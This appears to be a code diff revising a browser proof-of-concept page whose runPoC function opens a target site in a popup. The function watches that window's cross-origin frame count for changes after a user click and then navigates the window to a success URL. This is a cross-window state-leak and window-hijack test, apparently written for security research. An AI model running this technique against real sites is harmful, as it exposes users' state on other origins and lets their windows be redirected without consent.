@@ -48,116 +48,84 @@
     </div>
 
     <script>
-        // Detection Logic
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.has('success')) {
-                document.getElementById('mainView').classList.add('hidden');
-                document.getElementById('successView').classList.remove('hidden');
-                document.body.style.backgroundColor = "#fff5f5";
-            }
-        };
+function runPoC() {
+    const target = document.getElementById('targetUrl').value;
+    const statusDiv = document.getElementById('status');
+    const currentUrl = window.location.href.split('?')[0];
+    const successUrl = currentUrl + "?success=true";
 
-        function runPoC() {
-            const target = document.getElementById('targetUrl').value;
-            const statusDiv = document.getElementById('status');
-            
-            // Fix for File Not Found: Use current full URL and check if it already has a query string
-            const currentUrl = window.location.href.split('?')[0];
-            const successUrl = currentUrl + "?success=true";
-
-            if (!target.startsWith('http')) {
-                alert("Please enter a valid URL (including http:// or https://)");
-                return;
-            }
-
-            statusDiv.style.backgroundColor = "#e8f0fe";
-            statusDiv.style.color = "#1a73e8";
-            statusDiv.innerText = "Opening target and establishing link...";
-
-            // Open window with noopener=no to attempt relationship retention
-            const victimWindow = window.open(target, 'testWindow', 'width=1000,height=700,noopener=no');
-
-            if (!victimWindow) {
-                statusDiv.style.backgroundColor = "#fff0f0";
-                statusDiv.style.color = "#d93025";
-                statusDiv.innerText = "Error: Popup blocked! Allow popups to run the test.";
-                return;
-            }
-
-            // Step 1: let the popup settle a bit
-let initialFrames = null;
-let monitoringStarted = false;
-let monitorStopped = false;
-
-setTimeout(() => {
-    if (!victimWindow || victimWindow.closed) {
-        statusDiv.style.backgroundColor = "#fff0f0";
-        statusDiv.style.color = "#d93025";
-        statusDiv.innerText = "Popup closed before monitoring began.";
+    const victimWindow = window.open(target, 'testWindow', 'width=1000,height=700,noopener=no');
+    if (!victimWindow) {
+        statusDiv.innerText = "Popup blocked.";
         return;
     }
 
-    try {
-        initialFrames = victimWindow.frames.length;
-        statusDiv.style.backgroundColor = "#e8f0fe";
-        statusDiv.style.color = "#1a73e8";
-        statusDiv.innerText = "Baseline captured. Monitoring for popup state changes...";
-    } catch (e) {
-        statusDiv.style.backgroundColor = "#fff8e1";
-        statusDiv.style.color = "#8a6d3b";
-        statusDiv.innerText = "Baseline not readable. Monitoring for access changes...";
-    }
+    let armed = false;
+    let stableCount = 0;
+    let lastFrames = null;
+    let userGestureObserved = false;
+    let monitorStopped = false;
 
-    monitoringStarted = true;
-}, 3000);
+    statusDiv.innerText = "Waiting for popup to stabilize...";
 
-// Step 2: poll for visible state changes
-const check = setInterval(() => {
-    if (monitorStopped) {
-        clearInterval(check);
-        return;
-    }
-
-    if (!victimWindow || victimWindow.closed) {
-        monitorStopped = true;
-        clearInterval(check);
-        statusDiv.style.backgroundColor = "#fff0f0";
-        statusDiv.style.color = "#d93025";
-        statusDiv.innerText = "Popup was closed.";
-        return;
-    }
-
-    if (!monitoringStarted) {
-        return;
-    }
-
-    try {
-        const currentFrames = victimWindow.frames.length;
-
-        if (initialFrames !== null && currentFrames !== initialFrames) {
-            monitorStopped = true;
+    const check = setInterval(() => {
+        if (monitorStopped) {
             clearInterval(check);
-            statusDiv.style.backgroundColor = "#fff8e1";
-            statusDiv.style.color = "#8a6d3b";
-            statusDiv.innerText = "Observed state change: frame count changed.";
-            victimWindow.location.href = successUrl;
             return;
         }
 
-        statusDiv.style.backgroundColor = "#e8f0fe";
-        statusDiv.style.color = "#1a73e8";
-        statusDiv.innerText = "Monitoring... no observable change yet.";
-    } catch (e) {
-        monitorStopped = true;
-        clearInterval(check);
-        statusDiv.style.backgroundColor = "#fff8e1";
-        statusDiv.style.color = "#8a6d3b";
-        statusDiv.innerText = "Observed state change: popup became cross-origin/inaccessible.";
-        console.log("Access changed:", e);
-    }
-}, 400);
+        if (!victimWindow || victimWindow.closed) {
+            clearInterval(check);
+            statusDiv.innerText = "Popup closed.";
+            return;
         }
-    </script>
+
+        try {
+            const currentFrames = victimWindow.frames.length;
+
+            if (!armed) {
+                if (lastFrames === currentFrames) {
+                    stableCount++;
+                } else {
+                    stableCount = 0;
+                }
+
+                lastFrames = currentFrames;
+
+                if (stableCount >= 5) {
+                    armed = true;
+                    statusDiv.innerText = "Popup stabilized. Waiting for user-triggered change...";
+                }
+                return;
+            }
+
+            // Only detect after a user gesture has been observed
+            if (!userGestureObserved) {
+                statusDiv.innerText = "Armed, but waiting for user interaction...";
+                return;
+            }
+
+            if (currentFrames !== lastFrames) {
+                clearInterval(check);
+                statusDiv.innerText = "Post-click state change observed.";
+                victimWindow.location.href = successUrl;
+                return;
+            }
+
+            lastFrames = currentFrames;
+        } catch (e) {
+            if (armed && userGestureObserved) {
+                clearInterval(check);
+                statusDiv.innerText = "Post-click access change observed.";
+            }
+        }
+    }, 500);
+
+    document.getElementById('markClick').onclick = () => {
+        userGestureObserved = true;
+        statusDiv.innerText = "User click registered. Monitoring for resulting change...";
+    };
+}
+</script>
 </body>
 </html>
